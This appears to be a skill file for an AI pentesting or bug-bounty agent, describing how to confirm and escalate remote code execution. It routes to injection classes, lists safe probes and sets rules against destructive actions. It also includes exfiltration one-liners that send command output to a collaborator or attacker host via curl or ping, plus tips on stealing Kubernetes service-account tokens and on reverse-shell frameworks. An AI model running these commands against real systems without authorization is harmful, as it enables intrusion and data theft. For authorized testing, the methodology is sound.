---
name: hunt-rce
description: Remote code execution hunter — entry vectors, payload safety, exec chains across languages and runtimes.
keywords: [rce, remote code execution, command injection, shell, code injection, deserialization rce]
---

# hunt-rce

## When this skill loads

Triggers: "rce", "remote code execution", "shell on the box".

## Entry classes (re-routes)

RCE is a verdict, not an attack class. Find the actual injection
class:

| Indicator | Skill to load |
|---|---|
| Shell-metacharacters in user input | `hunt-cmdi` |
| `${...}`, `{{...}}`, `<%= %>` reflected | `hunt-ssti` |
| Java/PHP/Python serialized blob | `hunt-deserialization` |
| File upload accepted with executable handler | `hunt-file-upload` |
| `include`/`require` user-controlled | `hunt-lfi` |
| SQL with stacked queries | `hunt-sqli` (then `xp_cmdshell` / `COPY FROM PROGRAM`) |
| LDAP injection on Windows | `hunt-ldap` |
| Prototype pollution → gadget chain | `hunt-prototype-pollution` |

This skill's job: confirm exec, validate safely, escalate to
documented impact.

## Phase 1 — confirm exec (safe payload)

Never start with destructive commands. The probe is:

| Platform | Safe probe |
|---|---|
| Linux | `id`, `uname -a`, `whoami`, `hostname` |
| Windows | `whoami`, `hostname`, `systeminfo` (heavy), `cmd /c ver` |
| BSD | `id`, `uname -a` |
| Container | `cat /proc/1/cgroup`, `cat /etc/hostname` |

Out-of-band exec confirmation (when output not reflected):

- DNS pingback: `id|xargs -I{} curl http://{}.<collab>.oast.fun`
- HTTP pingback: `curl http://<collab>/$(id)`
- ICMP if outbound allowed: `ping -c1 <attacker-ip>` (rarely allowed)

## Phase 2 — context discovery

- Are we root / SYSTEM, or app user? `id` / `whoami /priv`
- Container or VM? `/proc/1/cgroup`, presence of `/.dockerenv`,
  `kubeletPlugins` paths
- Network egress? Test 80/443/53 to a collab
- Hostname → cloud (`169.254.169.254` reachable?)

## Phase 3 — reverse shell vs interactive

For bug-bounty PoC, **avoid** reverse shells. Use:

- Single command + DNS exfil for output
- Output-to-text file then download via existing read primitive
- Minimal blast radius — never plant binaries

For pentest/redteam with RoE permission, a reverse shell is fair
game. Use Sliver / Mythic / Brute Ratel rather than netcat.

## Phase 4 — destructive-action rules

Refuse to suggest commands that:
- Delete files (`rm`, `del`, `Remove-Item`)
- Modify configurations
- Spawn cron / scheduled tasks (unless persistence is in scope)
- Drop credentials to disk in shared paths

Always isolate writes to a clearly-named PoC path:
`/tmp/pentest-marker-<engagement>-<date>` or
`C:\Windows\Temp\pentest-marker-<engagement>-<date>.txt`.

## Phase 5 — chain to impact

| Single RCE limitation | Chain |
|---|---|
| Limited shell (e.g., `\` blocked) | Encode payload as base64, decode in shell |
| No output | DNS exfil per Phase 1 |
| Container, no escape | Read service-account token, query K8s API |
| Read-only filesystem | `/dev/shm`, `/tmp`, `/run` |
| Output truncated | Pipe through `base64 | head -c N` for chunked exfil |

## Disclosed-report patterns

| Source | Pattern |
|---|---|
| CVE-2021-44228 (log4shell) | JNDI lookup in log line → RCE |
| CVE-2022-22965 (Spring4Shell) | Class.module → RCE |
| CVE-2024-23897 (Jenkins CLI) | Args parser file read → escalates to RCE |
| CVE-2024-27198 (TeamCity) | Auth bypass + RCE primitive |
| CVE-2017-5638 (Struts2) | Content-Type OGNL → RCE |
| H1 #1062088 (GitLab project import) | SSRF → Redis → cron RCE |

## Never-submit fallbacks

- "RCE possible if..." without `id` proof → KILL
- Self-RCE on operator's own dev box that target serves to → KILL

## See also

- All listed sub-skills above
- `triage-validation` — Q1 evidence is the `id` output
- `redteam-mindset` — post-RCE positioning
